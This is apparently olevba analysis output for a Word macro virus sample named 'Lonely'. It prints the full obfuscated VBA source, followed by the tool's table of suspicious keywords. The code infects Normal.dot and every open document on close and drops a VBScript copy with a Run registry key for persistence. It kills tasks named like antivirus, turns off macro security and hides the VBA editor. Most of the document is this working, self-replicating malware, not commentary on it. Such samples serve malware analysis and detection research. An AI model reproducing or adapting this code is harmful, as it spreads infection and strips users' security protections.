olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lonely-97763dcad3cb0877ead6d2f2102d9f9c77669003
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lonely-97763dcad3cb0877ead6d2f2102d9f9c77669003 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Lonely-97763dcad3cb0877ead6d2f2102d9f9c77669003 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'LoneLy
Private Sub Document_Close()
On Error Resume Next
Retro
Stealth
With ThisDocument _
.VBProject _
.VBComponents(VBA.Int((VBA.Rnd * 0) + 1)) _
.CodeModule
Ourcode = .lines(VBA.Int((VBA.Rnd * 0) + 1), _
 .CountOfLines)
End With
VBSBackup Ourcode
With Normal _
.ThisDocument _
.VBProject _
.VBComponents(VBA.Int((VBA.Rnd * 0) + 1)) _
.CodeModule
    If .lines(VBA.Int((VBA.Rnd * 0) + 1), VBA.Int((VBA.Rnd * 0) + 1)) <> VBA.Chr(39) & VBA.Chr(76) & VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(101) & VBA.Chr(76) & VBA.Chr(121) Then
        .DeleteLines _
        VBA.Int((VBA.Rnd * 0) + 1), _
        .CountOfLines
        .AddFromstring _
        Ourcode
    End If
End With
For i = 1 To Documents _
.Count
With Documents(i) _
.VBProject _
.VBComponents(VBA.Int((VBA.Rnd * 0) + 1)) _
.CodeModule
    Documents(i).ReadOnlyRecommended = VBA.Int(VBA.Rnd * 0)
    If Documents(i).Saved = VBA.Int(VBA.Rnd * 0) Then
    If .lines(VBA.Int((VBA.Rnd * 0) + 1), VBA.Int((VBA.Rnd * 0) + 1)) <> VBA.Chr(39) & VBA.Chr(76) & VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(101) & VBA.Chr(76) & VBA.Chr(121) Then
        .DeleteLines _
        VBA.Int((VBA.Rnd * 0) + 1), _
        .CountOfLines
        .AddFromstring _
        Ourcode
    End If
    End If
End With
Next
End Sub

Private Function Decomp(a)
On Error Resume Next
For i = 1 To Len(a)
P = Mid(a, i, VBA.Int((VBA.Rnd * 0) + 1))
If P = VBA.Chr(72) Then P = VBA.Chr(72) & VBA.Chr(75) & VBA.Chr(69) & VBA.Chr(89) & VBA.Chr(95) & VBA.Chr(67) & VBA.Chr(85) & VBA.Chr(82) & VBA.Chr(82) & VBA.Chr(69) & VBA.Chr(78) & VBA.Chr(84) & VBA.Chr(95) & VBA.Chr(85) & VBA.Chr(83) & VBA.Chr(69) & VBA.Chr(82)
If P = VBA.Chr(83) Then P = VBA.Chr(83) & VBA.Chr(111) & VBA.Chr(102) & VBA.Chr(116) & VBA.Chr(119) & VBA.Chr(97) & VBA.Chr(114) & VBA.Chr(101)
If P = VBA.Chr(77) Then P = VBA.Chr(77) & VBA.Chr(105) & VBA.Chr(99) & VBA.Chr(114) & VBA.Chr(111) & VBA.Chr(115) & VBA.Chr(111) & VBA.Chr(102) & VBA.Chr(116)
If P = VBA.Chr(79) Then P = VBA.Chr(79) & VBA.Chr(102) & VBA.Chr(102) & VBA.Chr(105) & VBA.Chr(99) & VBA.Chr(101)
If P = VBA.Chr(50) Then P = VBA.Chr(57) & VBA.Chr(46) & VBA.Chr(48)
If P = VBA.Chr(88) Then P = VBA.Chr(49) & VBA.Chr(48) & VBA.Chr(46) & VBA.Chr(48)
If P = VBA.Chr(87) Then P = VBA.Chr(87) & VBA.Chr(111) & VBA.Chr(114) & VBA.Chr(100)
If P = VBA.Chr(81) Then P = VBA.Chr(83) & VBA.Chr(101) & VBA.Chr(99) & VBA.Chr(117) & VBA.Chr(114) & VBA.Chr(105) & VBA.Chr(116) & VBA.Chr(121)
If P = VBA.Chr(76) Then P = VBA.Chr(76) & VBA.Chr(101) & VBA.Chr(118) & VBA.Chr(101) & VBA.Chr(108)
If P = VBA.Chr(65) Then P = VBA.Chr(65) & VBA.Chr(99) & VBA.Chr(99) & VBA.Chr(101) & VBA.Chr(115) & VBA.Chr(115) & VBA.Chr(86) & VBA.Chr(66) & VBA.Chr(79) & VBA.Chr(77)
If P = VBA.Chr(84) Then P = VBA.Chr(84) & VBA.Chr(111) & VBA.Chr(111) & VBA.Chr(108) & VBA.Chr(115)
If P = VBA.Chr(49) Then P = VBA.Chr(77) & VBA.Chr(97) & VBA.Chr(99) & VBA.Chr(114) & VBA.Chr(111)
If P = VBA.Chr(51) Then P = VBA.Chr(87) & VBA.Chr(105) & VBA.Chr(110) & VBA.Chr(100) & VBA.Chr(105) & VBA.Chr(114)
If P = VBA.Chr(52) Then P = VBA.Chr(92) & VBA.Chr(108) & VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(101) & VBA.Chr(108) & VBA.Chr(121) & VBA.Chr(46)
Decomp = Decomp & P
Next
End Function

Private Sub VBSBackup(Ourcode)
On Error Resume Next
System.PrivateProfileString("", Decomp(VBA.Chr(72) & VBA.Chr(92) & VBA.Chr(83) & VBA.Chr(92) & VBA.Chr(77) & VBA.Chr(92) & VBA.Chr(87) & VBA.Chr(105) & VBA.Chr(110) & VBA.Chr(100) & VBA.Chr(111) & VBA.Chr(119) & VBA.Chr(115) & VBA.Chr(92) & VBA.Chr(67) & VBA.Chr(117) & VBA.Chr(114) & VBA.Chr(114) & VBA.Chr(101) & VBA.Chr(110) & VBA.Chr(116) & VBA.Chr(118) & VBA.Chr(101) & VBA.Chr(114) & VBA.Chr(115) & VBA.Chr(105) & VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(92) & VBA.Chr(114) & VBA.Chr(117) & VBA.Chr(110)), VBA.Chr(108) & VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(101) & VBA.Chr(108) & VBA.Chr(121)) = VBA.Environ(Decomp(VBA.Chr(51))) & Decomp(VBA.Chr(52) & VBA.Chr(118) & VBA.Chr(98) & VBA.Chr(115))
Open VBA.Environ(Decomp(VBA.Chr(51))) & Decomp(VBA.Chr(52) & VBA.Chr(119) & VBA.Chr(105) & VBA.Chr(110)) For Output As #1
    Print #1, Ourcode
Close #1
k = VBA.Int(VBA.Rnd * 10)
Open VBA.Environ(Decomp(VBA.Chr(51))) & Decomp(VBA.Chr(52) & VBA.Chr(118) & VBA.Chr(98) & VBA.Chr(115)) For Output As #1
Print #1, VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(32) & VBA.Chr(101) & VBA.Chr(114) & VBA.Chr(114) & VBA.Chr(111) & VBA.Chr(114) & VBA.Chr(32) & VBA.Chr(114) & VBA.Chr(101) & VBA.Chr(115) & VBA.Chr(117) & VBA.Chr(109) & VBA.Chr(101) & VBA.Chr(32) & VBA.Chr(110) & VBA.Chr(101) & VBA.Chr(120) & VBA.Chr(116)
Print #1, VBA.Chr(115) & VBA.Chr(101) & VBA.Chr(116) & VBA.Chr(32) & VBA.Chr(102) & VBA.Chr(115) & VBA.Chr(111) & VBA.Chr(32) & VBA.Chr(61) & VBA.Chr(32) & VBA.Chr(71) & VBA.Chr(101) & VBA.Chr(116) & VBA.Chr(111) & VBA.Chr(98) & VBA.Chr(106) & VBA.Chr(101) & VBA.Chr(99) & VBA.Chr(116) & VBA.Chr(40) & VBA.Chr(44) & VBA.Chr(34) & Decomp(VBA.Chr(87) & VBA.Chr(46) & VBA.Chr(97) & VBA.Chr(112) & VBA.Chr(112) & VBA.Chr(108) & VBA.Chr(105) & VBA.Chr(99) & VBA.Chr(97) & VBA.Chr(116) & VBA.Chr(105) & VBA.Chr(111) & VBA.Chr(110)) & VBA.Chr(34) & VBA.Chr(41)
Print #1, VBA.Chr(105) & VBA.Chr(102) & VBA.Chr(32) & VBA.Chr(102) & VBA.Chr(115) & VBA.Chr(111) & VBA.Chr(32) & VBA.Chr(61) & VBA.Chr(32) & VBA.Chr(34) & VBA.Chr(34) & VBA.Chr(32) & VBA.Chr(116) & VBA.Chr(104) & VBA.Chr(101) & VBA.Chr(110) & VBA.Chr(32)
Print #1, VBA.Chr(115) & VBA.Chr(101) & VBA.Chr(116) & VBA.Chr(32) & VBA.Chr(102) & VBA.Chr(115) & VBA.Chr(111) & VBA.Chr(32) & VBA.Chr(61) & VBA.Chr(32) & VBA.Chr(67) & VBA.Chr(114) & VBA.Chr(101) & VBA.Chr(97) & VBA.Chr(116) & VBA.Chr(101) & VBA.Chr(111) & VBA.Chr(98) & VBA.Chr(106) & VBA.Chr(101) & VBA.Chr(99) & VBA.Chr(116) & VBA.Chr(40) & VBA.Chr(34) & Decomp(VBA.Chr(87) & VBA.Chr(46) & VBA.Chr(97) & VBA.Chr(112) & VBA.Chr(112) & VBA.Chr(108) & VBA.Chr(105) & VBA.Chr(99) & VBA.Chr(97) & VBA.Chr(116) & VBA.Chr(105) & VBA.Chr(111) & VBA.Chr(110)) & VBA.Chr(34) & VBA.Chr(41)
Print #1, VBA.Chr(119) & VBA.Chr(105) & VBA.Chr(116) & VBA.Chr(104) & VBA.Chr(32) & VBA.Chr(102) & VBA.Chr(115) & VBA.Chr(111) & VBA.Chr(46) & VBA.Chr(110) & VBA.Chr(111) & VBA.Chr(114) & VBA.Chr(109) & VBA.Chr(97) & VBA.Chr(108) & VBA.Chr(116) & VBA.Chr(101) & VBA.Chr(109) & VBA.Chr(112) & VBA.Chr(108) & VBA.Chr(97) & VBA.Chr(116) & VBA.Chr(101) & VBA.Chr(32) & VBA.Chr(95) & VBA.Chr(32)
Print #1, VBA.Chr(46) & VBA.Chr(118) & VBA.Chr(98) & VBA.Chr(112) & VBA.Chr(114) & VBA.Chr(111) & VBA.Chr(106) & VBA.Chr(101) & VBA.Chr(99) & VBA.Chr(116) & VBA.Chr(46) & VBA.Chr(118) & VBA.Chr(98) & VBA.Chr(99) & VBA.Chr(111) & VBA.Chr(109) & VBA.Chr(112) & VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(101) & VBA.Chr(110) & VBA.Chr(116) & VBA.Chr(115) & VBA.Chr(40) & VBA.Chr(49) & VBA.Chr(41) & VBA.Chr(46) & VBA.Chr(99) & VBA.Chr(111) & VBA.Chr(100) & VBA.Chr(101) & VBA.Chr(109) & VBA.Chr(111) & VBA.Chr(100) & VBA.Chr(117) & VBA.Chr(108) & VBA.Chr(101)
Print #1, VBA.Chr(46) & VBA.Chr(100) & VBA.Chr(101) & VBA.Chr(108) & VBA.Chr(101) & VBA.Chr(116) & VBA.Chr(101) & VBA.Chr(108) & VBA.Chr(105) & VBA.Chr(110) & VBA.Chr(101) & VBA.Chr(115) & VBA.Chr(32) & k & VBA.Chr(45) & k & VBA.Chr(43) & VBA.Chr(49) & VBA.Chr(44) & VBA.Chr(32) & VBA.Chr(46) & VBA.Chr(99) & VBA.Chr(111) & VBA.Chr(117) & VBA.Chr(110) & VBA.Chr(116) & VBA.Chr(111) & VBA.Chr(102) & VBA.Chr(108) & VBA.Chr(105) & VBA.Chr(110) & VBA.Chr(101) & VBA.Chr(115)
Print #1, VBA.Chr(46) & VBA.Chr(97) & VBA.Chr(100) & VBA.Chr(100) & VBA.Chr(102) & VBA.Chr(114) & VBA.Chr(111) & VBA.Chr(109) & VBA.Chr(102) & VBA.Chr(105) & VBA.Chr(108) & VBA.Chr(101) & VBA.Chr(32) & VBA.Chr(34) & VBA.Environ(Decomp(VBA.Chr(51))) & Decomp(VBA.Chr(52) & VBA.Chr(119) & VBA.Chr(105) & VBA.Chr(110)) & VBA.Chr(34)
Print #1, VBA.Chr(101) & VBA.Chr(110) & VBA.Chr(100) & VBA.Chr(32) & VBA.Chr(119) & VBA.Chr(105) & VBA.Chr(116) & VBA.Chr(104)
Print #1, VBA.Chr(119) & VBA.Chr(105) & VBA.Chr(116) & VBA.Chr(104) & VBA.Chr(32) & VBA.Chr(102) & VBA.Chr(115) & VBA.Chr(111) & VBA.Chr(46) & VBA.Chr(111) & VBA.Chr(112) & VBA.Chr(116) & VBA.Chr(105) & VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(115)
Print #1, VBA.Chr(46) & VBA.Chr(115) & VBA.Chr(97) & VBA.Chr(118) & VBA.Chr(101) & VBA.Chr(110) & VBA.Chr(111) & VBA.Chr(114) & VBA.Chr(109) & VBA.Chr(97) & VBA.Chr(108) & VBA.Chr(112) & VBA.Chr(114) & VBA.Chr(111) & VBA.Chr(109) & VBA.Chr(112) & VBA.Chr(116) & VBA.Chr(32) & VBA.Chr(61) & VBA.Chr(32) & k & VBA.Chr(45) & k
Print #1, VBA.Chr(46) & VBA.Chr(99) & VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(102) & VBA.Chr(105) & VBA.Chr(114) & VBA.Chr(109) & VBA.Chr(99) & VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(118) & VBA.Chr(101) & VBA.Chr(114) & VBA.Chr(115) & VBA.Chr(105) & VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(115) & VBA.Chr(32) & VBA.Chr(61) & VBA.Chr(32) & k & VBA.Chr(45) & k
Print #1, VBA.Chr(46) & VBA.Chr(118) & VBA.Chr(105) & VBA.Chr(114) & VBA.Chr(117) & VBA.Chr(115) & VBA.Chr(112) & VBA.Chr(114) & VBA.Chr(111) & VBA.Chr(116) & VBA.Chr(101) & VBA.Chr(99) & VBA.Chr(116) & VBA.Chr(105) & VBA.Chr(111) & VBA.Chr(110) & VBA.Chr(32) & VBA.Chr(61) & VBA.Chr(32) & k & VBA.Chr(45) & k
Print #1, VBA.Chr(101) & VBA.Chr(110) & VBA.Chr(100) & VBA.Chr(32) & VBA.Chr(119) & VBA.Chr(105) & VBA.Chr(116) & VBA.Chr(104)
Print #1, VBA.Chr(102) & VBA.Chr(115) & VBA.Chr(111) & VBA.Chr(46) & VBA.Chr(110) & VBA.Chr(111) & VBA.Chr(114) & VBA.Chr(109) & VBA.Chr(97) & VBA.Chr(108) & VBA.Chr(116) & VBA.Chr(101) & VBA.Chr(109) & VBA.Chr(112) & VBA.Chr(108) & VBA.Chr(97) & VBA.Chr(116) & VBA.Chr(101) & VBA.Chr(46) & VBA.Chr(115) & VBA.Chr(97) & VBA.Chr(118) & VBA.Chr(101)
Print #1, VBA.Chr(102) & VBA.Chr(115) & VBA.Chr(111) & VBA.Chr(46) & VBA.Chr(113) & VBA.Chr(117) & VBA.Chr(105) & VBA.Chr(116)
Print #1, VBA.Chr(101) & VBA.Chr(110) & VBA.Chr(100) & VBA.Chr(32) & VBA.Chr(105) & VBA.Chr(102)
Close #1
End Sub

Private Sub Retro()
On Error Resume Next
For i = 1 To Tasks.Count
If LCase(VBA.InStr(1, Tasks(i).Name, "viru")) Then Tasks(i).Close
Next
End Sub

Private Sub Stealth()
On Error Resume Next
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
With Application
    If .Version = VBA.Chr(8) & VBA.Chr(46) & VBA.Chr(48) Then
        If .Options.VirusProtection <> VBA.Int(VBA.Rnd * 0) Then .Options.VirusProtection = VBA.Int(VBA.Rnd * 0)
    ElseIf .Version = VBA.Chr(50) Then
        If .System.PrivateProfileString("", Decomp(VBA.Chr(72) & VBA.Chr(92) & VBA.Chr(83) & VBA.Chr(92) & VBA.Chr(77) & VBA.Chr(92) & VBA.Chr(79) & VBA.Chr(92) & VBA.Chr(50) & VBA.Chr(92) & VBA.Chr(87) & VBA.Chr(92) & VBA.Chr(81)), Decomp(VBA.Chr(76))) <> 1& Then
            .System.PrivateProfileString("", Decomp(VBA.Chr(72) & VBA.Chr(92) & VBA.Chr(83) & VBA.Chr(92) & VBA.Chr(77) & VBA.Chr(92) & VBA.Chr(79) & VBA.Chr(92) & VBA.Chr(50) & VBA.Chr(92) & VBA.Chr(87) & VBA.Chr(92) & VBA.Chr(81)), Decomp(VBA.Chr(76))) = 1&
            WordBasic.exitdlg
        End If
    ElseIf .Version = VBA.Chr(88) Then
        .System.PrivateProfileString("", Decomp(VBA.Chr(72) & VBA.Chr(92) & VBA.Chr(83) & VBA.Chr(92) & VBA.Chr(77) & VBA.Chr(92) & VBA.Chr(79) & VBA.Chr(92) & VBA.Chr(88) & VBA.Chr(92) & VBA.Chr(87) & VBA.Chr(92) & VBA.Chr(81)), Decomp(VBA.Chr(76))) = 1&
        If .System.PrivateProfileString("", Decomp(VBA.Chr(72) & VBA.Chr(92) & VBA.Chr(83) & VBA.Chr(92) & VBA.Chr(77) & VBA.Chr(92) & VBA.Chr(79) & VBA.Chr(92) & VBA.Chr(88) & VBA.Chr(92) & VBA.Chr(87) & VBA.Chr(92) & VBA.Chr(81)), Decomp(VBA.Chr(65))) <> 1& Then
            .System.PrivateProfileString("", Decomp(VBA.Chr(72) & VBA.Chr(92) & VBA.Chr(83) & VBA.Chr(92) & VBA.Chr(77) & VBA.Chr(92) & VBA.Chr(79) & VBA.Chr(92) & VBA.Chr(88) & VBA.Chr(92) & VBA.Chr(87) & VBA.Chr(92) & VBA.Chr(81)), Decomp(VBA.Chr(65))) = 1&
            WordBasic.exitdlg
        End If
    End If
    If .ScreenUpdating <> VBA.Int(VBA.Rnd * 0) Then .ScreenUpdating = VBA.Int(VBA.Rnd * 0)
    If .DisplayAlerts <> wdAlertsNone Then .DisplayAlerts = wdAlertsNone
    If .CommandBars(Decomp(VBA.Chr(84))).Controls(Decomp(VBA.Chr(49))).Enabled = True Then
        .CommandBars(Decomp(VBA.Chr(84))).Controls(Decomp(VBA.Chr(49))).Enabled = VBA.Int(VBA.Rnd * 0)
    End If
    If .Version = Decomp(VBA.Chr(50)) Or .Version = Decomp(VBA.Chr(88)) Then
        If .CommandBars(Decomp(VBA.Chr(49))).Controls(Decomp(VBA.Chr(81 & VBA.Chr(46) & VBA.Chr(46) & VBA.Chr(46)))).Enabled = True Then
            .CommandBars(Decomp(VBA.Chr(49))).Controls(Decomp(VBA.Chr(81 & VBA.Chr(46) & VBA.Chr(46) & VBA.Chr(46)))).Enabled = VBA.Int(VBA.Rnd * 0)
        End If
    End If
    With .Options
        If .ConfirmConversions <> VBA.Int(VBA.Rnd * 0) Then .ConfirmConversions = VBA.Int(VBA.Rnd * 0)
        If .SaveNormalPrompt <> VBA.Int(VBA.Rnd * 0) Then .SaveNormalPrompt = VBA.Int(VBA.Rnd * 0)
    End With
    If .CommandBars(VBA.Chr(86) & VBA.Chr(105) & VBA.Chr(115) & VBA.Chr(117) & VBA.Chr(97) & VBA.Chr(108) & VBA.Chr(32) & VBA.Chr(66) & VBA.Chr(97) & VBA.Chr(115) & VBA.Chr(105) & VBA.Chr(99)).Visible <> VBA.Int(VBA.Rnd * 0) Then
    .CommandBars(VBA.Chr(86) & VBA.Chr(105) & VBA.Chr(115) & VBA.Chr(117) & VBA.Chr(97) & VBA.Chr(108) & VBA.Chr(32) & VBA.Chr(66) & VBA.Chr(97) & VBA.Chr(115) & VBA.Chr(105) & VBA.Chr(99)).Visible = VBA.Int(VBA.Rnd * 0)
    End If
    If .CommandBars(VBA.Chr(86) & VBA.Chr(105) & VBA.Chr(115) & VBA.Chr(117) & VBA.Chr(97) & VBA.Chr(108) & VBA.Chr(32) & VBA.Chr(66) & VBA.Chr(97) & VBA.Chr(115) & VBA.Chr(105) & VBA.Chr(99)).Enabled <> VBA.Int(VBA.Rnd * 0) Then
    .CommandBars(VBA.Chr(86) & VBA.Chr(105) & VBA.Chr(115) & VBA.Chr(117) & VBA.Chr(97) & VBA.Chr(108) & VBA.Chr(32) & VBA.Chr(66) & VBA.Chr(97) & VBA.Chr(115) & VBA.Chr(105) & VBA.Chr(99)).Enabled = VBA.Int(VBA.Rnd * 0)
    End If
    If .CommandBars(VBA.Chr(86) & VBA.Chr(105) & VBA.Chr(115) & VBA.Chr(117) & VBA.Chr(97) & VBA.Chr(108) & VBA.Chr(32) & VBA.Chr(66) & VBA.Chr(97) & VBA.Chr(115) & VBA.Chr(105) & VBA.Chr(99)).Protection <> msoBarNoChangeVisible Then
    .CommandBars(VBA.Chr(86) & VBA.Chr(105) & VBA.Chr(115) & VBA.Chr(117) & VBA.Chr(97) & VBA.Chr(108) & VBA.Chr(32) & VBA.Chr(66) & VBA.Chr(97) & VBA.Chr(115) & VBA.Chr(105) & VBA.Chr(99)).Protection = msoBarNoChangeVisible
    End If
    If .CommandBars(VBA.Chr(86) & VBA.Chr(105) & VBA.Chr(115) & VBA.Chr(117) & VBA.Chr(97) & VBA.Chr(108) & VBA.Chr(32) & VBA.Chr(66) & VBA.Chr(97) & VBA.Chr(115) & VBA.Chr(105) & VBA.Chr(99)).Protection <> msoBarNoCustomize Then
    .CommandBars(VBA.Chr(86) & VBA.Chr(105) & VBA.Chr(115) & VBA.Chr(117) & VBA.Chr(97) & VBA.Chr(108) & VBA.Chr(32) & VBA.Chr(66) & VBA.Chr(97) & VBA.Chr(115) & VBA.Chr(105) & VBA.Chr(99)).Protection = msoBarNoCustomize
    End If
    If .CommandBars(VBA.Chr(84) & VBA.Chr(111) & VBA.Chr(111) & VBA.Chr(108) & VBA.Chr(115)).Controls(VBA.Chr(67) & VBA.Chr(117) & VBA.Chr(115) & VBA.Chr(116) & VBA.Chr(111) & VBA.Chr(109) & VBA.Chr(105) & VBA.Chr(122) & VBA.Chr(101) & VBA.Chr(46) & VBA.Chr(46) & VBA.Chr(46)).Enabled <> VBA.Int(VBA.Rnd * 0) Then
    .CommandBars(VBA.Chr(84) & VBA.Chr(111) & VBA.Chr(111) & VBA.Chr(108) & VBA.Chr(115)).Controls(VBA.Chr(67) & VBA.Chr(117) & VBA.Chr(115) & VBA.Chr(116) & VBA.Chr(111) & VBA.Chr(109) & VBA.Chr(105) & VBA.Chr(122) & VBA.Chr(101) & VBA.Chr(46) & VBA.Chr(46) & VBA.Chr(46)).Enabled = VBA.Int(VBA.Rnd * 0) = VBA.Int(VBA.Rnd * 0)
    End If
End With
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

